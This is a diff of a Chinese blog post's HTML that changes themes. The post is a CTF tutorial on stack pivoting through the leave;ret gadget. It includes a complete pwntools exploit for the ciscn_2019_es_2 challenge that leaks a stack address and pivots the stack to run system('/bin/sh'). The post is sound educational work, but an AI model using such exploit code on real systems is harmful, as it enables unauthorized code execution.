@@ -1,320 +1,704 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
+  <head>
   <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width">
-<meta name="theme-color" content="#222">
-<meta name="generator" content="Hexo 6.0.0">
-
-
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
-  <link rel="mask-icon" href="/images/logo.svg" color="#222">
-
-<link rel="stylesheet" href="/css/main.css">
-
-
-
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
-  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
-
-<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.9.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
-<meta name="description" content="栈迁移什么是栈迁移(适用的地方)栈迁移主要是为了解决栈溢出空间大小不足的问题 简单的说：就是通过修改ebp指针来修改栈帧的位置和大小 栈迁移的实现通过将ebp覆盖成我们构造的fake_ebp ，然后利用leave_ret这个gadget将esp劫持到fake_ebp的地址上。 leave_ret:leave: 12mov esp,ebp;pop ebp;  ret: 1pop eip  假如，有一">
-<meta property="og:type" content="article">
-<meta property="og:title" content="栈迁移">
-<meta property="og:url" content="http://example.com/2022/04/18/%E6%A0%88%E8%BF%81%E7%A7%BB/index.html">
-<meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="栈迁移什么是栈迁移(适用的地方)栈迁移主要是为了解决栈溢出空间大小不足的问题 简单的说：就是通过修改ebp指针来修改栈帧的位置和大小 栈迁移的实现通过将ebp覆盖成我们构造的fake_ebp ，然后利用leave_ret这个gadget将esp劫持到fake_ebp的地址上。 leave_ret:leave: 12mov esp,ebp;pop ebp;  ret: 1pop eip  假如，有一">
-<meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://blog.tianzheng.cool/wp-content/uploads/2021/07/1.png">
-<meta property="og:image" content="http://blog.tianzheng.cool/wp-content/uploads/2021/07/2.png">
-<meta property="og:image" content="http://blog.tianzheng.cool/wp-content/uploads/2021/07/3.png">
-<meta property="og:image" content="http://blog.tianzheng.cool/wp-content/uploads/2021/07/4.png">
-<meta property="og:image" content="http://blog.tianzheng.cool/wp-content/uploads/2021/07/5.png">
-<meta property="og:image" content="http://blog.tianzheng.cool/wp-content/uploads/2021/07/6-1-1024x568.png">
-<meta property="og:image" content="c:/Users/youlin/AppData/Roaming/Typora/typora-user-images/image-20220418115704991.png">
-<meta property="og:image" content="c:/Users/youlin/AppData/Roaming/Typora/typora-user-images/image-20220418115642138.png">
-<meta property="og:image" content="c:/Users/youlin/AppData/Roaming/Typora/typora-user-images/image-20220418115858569.png">
-<meta property="article:published_time" content="2022-04-17T16:28:53.000Z">
-<meta property="article:modified_time" content="2022-04-18T04:23:13.937Z">
-<meta property="article:author" content="John Doe">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://blog.tianzheng.cool/wp-content/uploads/2021/07/1.png">
-
-
-<link rel="canonical" href="http://example.com/2022/04/18/%E6%A0%88%E8%BF%81%E7%A7%BB/">
-
-
-
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2022/04/18/%E6%A0%88%E8%BF%81%E7%A7%BB/","path":"2022/04/18/栈迁移/","title":"栈迁移"}</script>
-
-<script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>栈迁移 | Hexo</title>
+  <meta 
+    name="viewport"
+    content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
+  <meta 
+    http-equiv="X-UA-Compatible" 
+    content="ie=edge">
+  <meta 
+    name="theme-color" 
+    content="#fff" 
+    id="theme-color">
+  <meta 
+    name="description" 
+    content="Hexo">
+  <link 
+    rel="icon" 
+    href="https://s2.loli.net/2022/08/21/ZKlhxJmDBvLf96O.jpg">
+  <title>栈迁移</title>
   
-
-
-
-
-  <noscript>
-    <link rel="stylesheet" href="/css/noscript.css">
-  </noscript>
-</head>
-
-<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
-  <div class="headband"></div>
-
-  <main class="main">
-    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-container">
-  <div class="site-nav-toggle">
-    <div class="toggle" aria-label="Toggle navigation bar" role="button">
-    </div>
-  </div>
-
-  <div class="site-meta">
-
-    <a href="/" class="brand" rel="start">
-      <i class="logo-line"></i>
-      <p class="site-title">Hexo</p>
-      <i class="logo-line"></i>
-    </a>
-  </div>
-
-  <div class="site-nav-right">
-    <div class="toggle popup-trigger">
-    </div>
-  </div>
-</div>
-
-
-
-
-
-
-
-</div>
-        
-  
-  <div class="toggle sidebar-toggle" role="button">
-    <span class="toggle-line"></span>
-    <span class="toggle-line"></span>
-    <span class="toggle-line"></span>
-  </div>
-
-  <aside class="sidebar">
-
-    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
-      <ul class="sidebar-nav">
-        <li class="sidebar-nav-toc">
-          Table of Contents
-        </li>
-        <li class="sidebar-nav-overview">
-          Overview
-        </li>
-      </ul>
-
-      <div class="sidebar-panel-container">
-        <!--noindex-->
-        <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%A0%88%E8%BF%81%E7%A7%BB"><span class="nav-number">1.</span> <span class="nav-text">栈迁移</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%A0%88%E8%BF%81%E7%A7%BB-%E9%80%82%E7%94%A8%E7%9A%84%E5%9C%B0%E6%96%B9"><span class="nav-number">1.1.</span> <span class="nav-text">什么是栈迁移(适用的地方)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%A0%88%E8%BF%81%E7%A7%BB%E7%9A%84%E5%AE%9E%E7%8E%B0"><span class="nav-number">1.2.</span> <span class="nav-text">栈迁移的实现</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#leave-ret"><span class="nav-number">1.2.0.1.</span> <span class="nav-text">leave_ret:</span></a></li></ol></li></ol></li></ol></li></ol></div>
-        </div>
-        <!--/noindex-->
-
-        <div class="site-overview-wrap sidebar-panel">
-          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
-  <p class="site-author-name" itemprop="name">John Doe</p>
-  <div class="site-description" itemprop="description"></div>
-</div>
-<div class="site-state-wrap site-overview-item animated">
-  <nav class="site-state">
-      <div class="site-state-item site-state-posts">
-        <a href="/archives/">
-          <span class="site-state-item-count">11</span>
-          <span class="site-state-item-name">posts</span>
-        </a>
-      </div>
-  </nav>
-</div>
-
-
-
-        </div>
-      </div>
-    </div>
-  </aside>
-  <div class="sidebar-dimmer"></div>
-
-
-    </header>
-
     
-  <div class="back-to-top" role="button" aria-label="Back to top">
-    <i class="fa fa-arrow-up"></i>
-    <span>0%</span>
-  </div>
-
-<noscript>
-  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
-</noscript>
-
-
-    <div class="main-inner post posts-expand">
-
-
-  
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/18/%E6%A0%88%E8%BF%81%E7%A7%BB/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-      <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
-          栈迁移
-        </h1>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">Posted on</span>
+      <meta 
+        property="og:title" 
+        content="栈迁移">
+    
+    
+      <meta 
+        property="og:url" 
+        content="http://example.com/2022/04/18/%E6%A0%88%E8%BF%81%E7%A7%BB/index.html">
+    
+    
+      <meta 
+        property="og:img" 
+        content="https://s2.loli.net/2022/08/21/ZKlhxJmDBvLf96O.jpg">
+    
+    
+    
+      <meta 
+        property="og:type" 
+        content="article">
+      <meta 
+        property="og:article:published_time" 
+        content="2022-04-18">
+      <meta 
+        property="og:article:modified_time" 
+        content="2022-04-18">
+      <meta 
+        property="og:article:author" 
+        content="幽林">
       
-
-      <time title="Created: 2022-04-18 00:28:53 / Modified: 12:23:13" itemprop="dateCreated datePublished" datetime="2022-04-18T00:28:53+08:00">2022-04-18</time>
-    </span>
-
+        
+      
+    
   
+  
+  <link rel="preload" href="//at.alicdn.com/t/font_1946621_i1kgafibvw.css" as="style" >
+  <link rel="preload" href="//at.alicdn.com/t/font_1952792_89b4ac4k4up.css" as="style" >
+  <link rel="preload" href="/css/main.css" as="style" >
+  
+  <link rel="modulepreload" href="//instant.page/5.1.0">
+  
+  <link rel="stylesheet" href="/css/main.css">
+  
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1946621_i1kgafibvw.css">
+  
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1952792_89b4ac4k4up.css">
+  
+  
+  
+    <link rel="stylesheet" href="/js/lib/lightbox/baguetteBox.min.css">
+  
+  <script>
+    function loadScript(url, cb) {
+      var script = document.createElement('script');
+      script.src = url;
+      if (cb) script.onload = cb;
+      script.async = true;
+      document.body.appendChild(script);
+    }
+    function loadCSS(href, data, attr) {
+      var sheet = document.createElement('link');
+      sheet.ref = 'stylesheet';
+      sheet.href = href;
+      sheet.dataset[data] = attr;
+      document.head.appendChild(sheet);
+    }
+    function changeCSS(cssFile, data, attr) {
+      var oldlink = document.querySelector(data);
+      var newlink = document.createElement("link");
+      newlink.setAttribute("rel", "stylesheet");
+      newlink.setAttribute("href", cssFile);
+      newlink.dataset.prism = attr;
+      document.head.replaceChild(newlink, oldlink);
+    }
+  </script>
+  
+    
+  
+  <script>
+    // control reverse button
+    var reverseDarkList = {
+      dark: 'light',
+      light: 'dark'
+    };
+    var themeColor = {
+      dark: '#1c1c1e',
+      light: '#fff'
+    }
+    // get the data of css prefers-color-scheme
+    var getCssMediaQuery = function() {
+      return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light';
+    };
+    // reverse current darkmode setting function
+    var reverseDarkModeSetting = function() {
+      var setting = localStorage.getItem('user-color-scheme');
+      if(reverseDarkList[setting]) {
+        setting = reverseDarkList[setting];
+      } else if(setting === null) {
+        setting = reverseDarkList[getCssMediaQuery()];
+      } else {
+        return;
+      }
+      localStorage.setItem('user-color-scheme', setting);
+      return setting;
+    };
+    // apply current darkmode setting
+  </script>
+  
+    <script>
+      var setDarkmode = function(mode) {
+      var setting = mode || localStorage.getItem('user-color-scheme');
+      if(setting === getCssMediaQuery()) {
+        document.documentElement.removeAttribute('data-user-color-scheme');
+        localStorage.removeItem('user-color-scheme');
+        document.getElementById('theme-color').content = themeColor[setting];
+        document.getElementById('theme-color').dataset.mode = setting;
+      } else if(reverseDarkList[setting]) {
+        document.documentElement.setAttribute('data-user-color-scheme', setting);
+        document.getElementById('theme-color').content = themeColor[setting];
+        document.getElementById('theme-color').dataset.mode = setting;
+      } else {
+        document.documentElement.removeAttribute('data-user-color-scheme');
+        localStorage.removeItem('user-color-scheme');
+        document.getElementById('theme-color').content = themeColor[getCssMediaQuery()];
+        document.getElementById('theme-color').dataset.mode = getCssMediaQuery();
+      }
+    };
+    setDarkmode();
+    </script>
+  
+  
+  
+    <link rel="preload" href="/js/lib/lightbox/baguetteBox.min.js" as="script">
+    <link rel="preload" href="/js/lib/lightbox/baguetteBox.min.css" as="style" >
+  
+  
+    <link rel="preload" href="/js/lib/lozad.min.js" as="script">
+  
+  
+  
+  
+  
+  
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+  <body>
+    <div class="wrapper">
+       
+      <nav class="navbar">
+  <div class="navbar-logo">
+    <a class="navbar-logo-main" href="/">
+      
+        <img 
+          class="navbar-logo-img"
+          width="32"
+          height="32"
+          src="https://s2.loli.net/2022/08/21/ZKlhxJmDBvLf96O.jpg" 
+          alt="blog logo">
+      
+      <span class="navbar-logo-dsc">幽林</span>
+      </a>
+  </div>
+  <div class="navbar-menu">
+    
+      <a 
+        href="/" 
+        class="navbar-menu-item">
+        
+          Home
+        
+      </a>
+    
+      <a 
+        href="/archives" 
+        class="navbar-menu-item">
+        
+          Archive
+        
+      </a>
+    
+      <a 
+        href="/tags" 
+        class="navbar-menu-item">
+        
+          Tags
+        
+      </a>
+    
+      <a 
+        href="/categories" 
+        class="navbar-menu-item">
+        
+          Categories
+        
+      </a>
+    
+      <a 
+        href="/about" 
+        class="navbar-menu-item">
+        
+          About
+        
+      </a>
+    
+      <a 
+        href="/links" 
+        class="navbar-menu-item">
+        
+          Friends
+        
+      </a>
+    
+    <button 
+      class="navbar-menu-item darknavbar navbar-menu-btn" 
+      aria-label="Toggle dark mode"
+      id="dark">
+      <i class="iconfont icon-weather"></i>
+    </button>
+    <button 
+      class="navbar-menu-item searchnavbar navbar-menu-btn" 
+      aria-label="Toggle search"
+      id="search">
+      <!-- <i 
+        class="iconfont icon-search" 
+        style="font-size: 1.2rem; font-weight: 400;">
+      </i> -->
+      <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true" role="img"
+        class="iconify iconify--ion" width="28" height="28" preserveAspectRatio="xMidYMid meet" viewBox="0 0 512 512">
+        <path fill="none" stroke="currentColor" stroke-miterlimit="10" stroke-width="28"
+          d="M256 80a176 176 0 1 0 176 176A176 176 0 0 0 256 80Z"></path>
+        <path fill="none" stroke="currentColor" stroke-miterlimit="10" stroke-width="28"
+          d="M232 160a72 72 0 1 0 72 72a72 72 0 0 0-72-72Z"></path>
+        <path fill="none" stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="28"
+          d="M283.64 283.64L336 336"></path>
+      </svg>
+    </button>
+  </div>
+</nav> 
+      
+      <div 
+        id="local-search" 
+        style="display: none">
+        <input
+          class="navbar-menu-item"
+          id="search-input"
+          placeholder="请输入搜索内容..." />
+        <div id="search-content"></div>
+      </div>
+      
+      <div class="section-wrap">
+        <div class="container">
+          <div class="columns">
+            <aside class="left-column">
+              
+              <div class="card card-author">
+                
+  <img 
+    src="https://s2.loli.net/2022/08/21/ZKlhxJmDBvLf96O.jpg" 
+    class="author-img"
+    width="88"
+    height="88"
+    alt="author avatar">
+
+<p class="author-name">幽林</p>
+<p class="author-description">designed by theme-kaze</p>
+<div class="author-message">
+  <a 
+    class="author-posts-count" 
+    href="/archives">
+    <span>11</span>
+    <span>Posts</span>
+  </a>
+  <a 
+    class="author-categories-count" 
+    href="/categories">
+    <span>0</span>
+    <span>Categories</span>
+  </a>
+  <a 
+    class="author-tags-count" 
+    href="/tags">
+    <span>0</span>
+    <span>Tags</span>
+  </a>
 </div>
 
-        </div>
-      </header>
-
+              </div>
+               <div class="sticky-tablet">
+  
+  
+    <article class="display-when-two-columns spacer">
+      <div class="card card-content toc-card">
+        <div class="toc-header">
+  <i 
+    class="iconfont icon-menu" 
+    style="padding-right: 2px;">
+  </i>TOC
+</div>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A0%88%E8%BF%81%E7%A7%BB"><span class="toc-text">栈迁移</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%A0%88%E8%BF%81%E7%A7%BB-%E9%80%82%E7%94%A8%E7%9A%84%E5%9C%B0%E6%96%B9"><span class="toc-text">什么是栈迁移(适用的地方)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%88%E8%BF%81%E7%A7%BB%E7%9A%84%E5%AE%9E%E7%8E%B0"><span class="toc-text">栈迁移的实现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#leave-ret"><span class="toc-text">leave_ret:</span></a></li></ol></li></ol></li></ol></li></ol>
+      </div>
+    </article>
+  
+  
+  <article class="card card-content categories-widget">
+    <div class="categories-card">
+  <div class="categories-header">
+    <i 
+      class="iconfont icon-fenlei" 
+      style="padding-right: 2px;">
+    </i>Categories
+  </div>
+  <div class="categories-list">
+    
+  </div>
+</div>
+  </article>
+  
+  <article class="card card-content tags-widget">
+    <div class="tags-card">
+  <div class="tags-header">
+    <i 
+      class="iconfont icon-biaoqian" 
+      style="padding-right: 2px;">
+    </i>hot tags
+  </div>
+  <div class="tags-list">
+    
+  </div>
+</div>
+  </article>
+  
+  
+</div>
+            </aside>
+            <main class="main-column">
+              
+<article class="card card-content">
+  <header>
+    <h1 class="post-title">
+      栈迁移
+    </h1>
+  </header>
+  <div class="post-meta post-show-meta">
+    <time datetime="2022-04-17T16:28:53.000Z">
+      <i 
+        class="iconfont icon-calendar" 
+        style="margin-right: 2px;">
+      </i>
+      <span>2022-04-18</span>
+    </time>
     
     
+      <span class="dot"></span>
+      <span>558 words</span>
     
-    <div class="post-body" itemprop="articleBody">
-        <h1 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h1><h2 id="什么是栈迁移-适用的地方"><a href="#什么是栈迁移-适用的地方" class="headerlink" title="什么是栈迁移(适用的地方)"></a>什么是栈迁移(适用的地方)</h2><p>栈迁移主要是为了解决栈溢出空间大小不足的问题</p>
+  </div>
+  
+  </header>
+  <div 
+    id="section" 
+    class="post-content">
+    <h1 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h1><h2 id="什么是栈迁移-适用的地方"><a href="#什么是栈迁移-适用的地方" class="headerlink" title="什么是栈迁移(适用的地方)"></a>什么是栈迁移(适用的地方)</h2><p>栈迁移主要是为了解决栈溢出空间大小不足的问题</p>
 <p>简单的说：就是通过修改ebp指针来修改栈帧的位置和大小</p>
 <h2 id="栈迁移的实现"><a href="#栈迁移的实现" class="headerlink" title="栈迁移的实现"></a>栈迁移的实现</h2><p>通过将ebp覆盖成我们构造的fake_ebp ，然后利用leave_ret这个gadget将esp劫持到fake_ebp的地址上。</p>
 <h4 id="leave-ret"><a href="#leave-ret" class="headerlink" title="leave_ret:"></a>leave_ret:</h4><p>leave:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov esp,ebp;</span><br><span class="line">pop ebp;</span><br></pre></td></tr></table></figure>
+<pre class="highlight"><span class="line">mov esp,ebp;</span><br><span class="line">pop ebp;</span><br></pre>
 
 <p>ret:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop eip</span><br></pre></td></tr></table></figure>
+<pre class="highlight"><span class="line">pop eip</span><br></pre>
 
 <p>假如，有一个程序，存在栈溢出漏洞，我们把内容覆盖成了下面这个样子：</p>
 <p>当然此时 bss 段或者 data 段还没有内容，待会会通过 read 函数输入</p>
-<p><img src="http://blog.tianzheng.cool/wp-content/uploads/2021/07/1.png"></p>
+<p><img  srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="http://blog.tianzheng.cool/wp-content/uploads/2021/07/1.png" class="lozad post-image"src="http://blog.tianzheng.cool/wp-content/uploads/2021/07/1.png"></p>
 <p>在call调用之后，会有下面的指令：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov esp,ebp</span><br><span class="line">pop ebp</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+<pre class="highlight"><span class="line">mov esp,ebp</span><br><span class="line">pop ebp</span><br><span class="line">ret</span><br></pre>
 
 <p>当我们挨个去执行的时候会出现这样的情况</p>
 <p>执行完mov esp,ebp后的情况：</p>
-<p><img src="http://blog.tianzheng.cool/wp-content/uploads/2021/07/2.png"></p>
+<p><img  srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="http://blog.tianzheng.cool/wp-content/uploads/2021/07/2.png" class="lozad post-image"src="http://blog.tianzheng.cool/wp-content/uploads/2021/07/2.png"></p>
 <p>pop ebp:(别忘了执行完pop ebp后esp会自动减一个内存单位)</p>
-<p><img src="http://blog.tianzheng.cool/wp-content/uploads/2021/07/3.png"></p>
+<p><img  srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="http://blog.tianzheng.cool/wp-content/uploads/2021/07/3.png" class="lozad post-image"src="http://blog.tianzheng.cool/wp-content/uploads/2021/07/3.png"></p>
 <p>这时候就到 ret 了，我们可以通过 read 函数来把内容输入到 fake ebp1 的地址处</p>
 <p>构造的内容主要是把 fake ebp1 处写成 fake ebp2 的地址</p>
-<p><img src="http://blog.tianzheng.cool/wp-content/uploads/2021/07/4.png"></p>
+<p><img  srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="http://blog.tianzheng.cool/wp-content/uploads/2021/07/4.png" class="lozad post-image"src="http://blog.tianzheng.cool/wp-content/uploads/2021/07/4.png"></p>
 <p>read 函数执行完成以后程序返回到了 leave_ret，这样就会在执行一遍上面说的那样</p>
 <p>首先是 mov esp,ebp 执行完成后效果如下：</p>
-<p><img src="http://blog.tianzheng.cool/wp-content/uploads/2021/07/5.png"></p>
+<p><img  srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="http://blog.tianzheng.cool/wp-content/uploads/2021/07/5.png" class="lozad post-image"src="http://blog.tianzheng.cool/wp-content/uploads/2021/07/5.png"></p>
 <p>然后是 pop ebp，执行完成后：</p>
-<p><img src="http://blog.tianzheng.cool/wp-content/uploads/2021/07/6-1-1024x568.png"></p>
+<p><img  srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="http://blog.tianzheng.cool/wp-content/uploads/2021/07/6-1-1024x568.png" class="lozad post-image"src="http://blog.tianzheng.cool/wp-content/uploads/2021/07/6-1-1024x568.png"></p>
 <p>此时再执行 ret 命令，他就会执行我们构造在 bss 段后者 data 段的那个函数</p>
 <p>这样我们就成功的将栈迁移到了bss段</p>
 <p>例题：ciscn_2019_es_2</p>
-<p><img src="C:\Users\youlin\AppData\Roaming\Typora\typora-user-images\image-20220418115704991.png" alt="image-20220418115704991"></p>
-<p><img src="C:\Users\youlin\AppData\Roaming\Typora\typora-user-images\image-20220418115642138.png" alt="image-20220418115642138"></p>
+<p><img src="C:\Users\youlin\AppData\Roaming\Typora\typora-user-images\image-20220418115704991.png" alt="image-20220418115704991" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="C:\Users\youlin\AppData\Roaming\Typora\typora-user-images\image-20220418115704991.png" class="lozad post-image"></p>
+<p><img src="C:\Users\youlin\AppData\Roaming\Typora\typora-user-images\image-20220418115642138.png" alt="image-20220418115642138" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="C:\Users\youlin\AppData\Roaming\Typora\typora-user-images\image-20220418115642138.png" class="lozad post-image"></p>
 <p>从上图可以看出该题可以进行栈溢出，但是由于溢出的长度不够所以我们选择进行栈迁移</p>
-<p><img src="C:\Users\youlin\AppData\Roaming\Typora\typora-user-images\image-20220418115858569.png" alt="image-20220418115858569"></p>
+<p><img src="C:\Users\youlin\AppData\Roaming\Typora\typora-user-images\image-20220418115858569.png" alt="image-20220418115858569" srcset="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20300%20300'%3E%3C/svg%3E" data-src="C:\Users\youlin\AppData\Roaming\Typora\typora-user-images\image-20220418115858569.png" class="lozad post-image"></p>
 <p>通过调试可以知道该题可以泄露栈的地址，ebp上存的地址距离ebp为0x10，因此可以将构造的system(“/bin/sh”),写入栈中来执行</p>
 <p>该题的exp如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dgb</span>():</span></span><br><span class="line">	gdb.attach(io)</span><br><span class="line">	pause()</span><br><span class="line">io=process(<span class="string">&quot;./ciscn_2019_es_2&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./ciscn_2019_es_2&quot;</span>)</span><br><span class="line">sys_addr=elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">leave_ret=<span class="number">0x80484b8</span></span><br><span class="line">payload=<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x24</span>+<span class="string">b&#x27;bbbb&#x27;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">leak_addr=u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="comment">#dgb()</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;leak_addr:&quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">payload1=(<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(sys_addr)+<span class="string">b&#x27;bbbb&#x27;</span>+p32(leak_addr-<span class="number">0x28</span>)+<span class="string">b&#x27;/bin/sh&#x27;</span>).ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload1+=p32(leak_addr-<span class="number">0x38</span>)+p32(leave_ret)</span><br><span class="line">io.send(payload1)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<pre class="highlight"><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dgb</span>():</span></span><br><span class="line">	gdb.attach(io)</span><br><span class="line">	pause()</span><br><span class="line">io=process(<span class="string">&quot;./ciscn_2019_es_2&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;./ciscn_2019_es_2&quot;</span>)</span><br><span class="line">sys_addr=elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">leave_ret=<span class="number">0x80484b8</span></span><br><span class="line">payload=<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x24</span>+<span class="string">b&#x27;bbbb&#x27;</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">leak_addr=u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="comment">#dgb()</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;leak_addr:&quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">payload1=(<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(sys_addr)+<span class="string">b&#x27;bbbb&#x27;</span>+p32(leak_addr-<span class="number">0x28</span>)+<span class="string">b&#x27;/bin/sh&#x27;</span>).ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload1+=p32(leak_addr-<span class="number">0x38</span>)+p32(leave_ret)</span><br><span class="line">io.send(payload1)</span><br><span class="line">io.interactive()</span><br></pre>
 
 
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-
-        
-
-          <div class="post-nav">
-            <div class="post-nav-item">
-                <a href="/2022/04/10/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/" rel="prev" title="整数溢出">
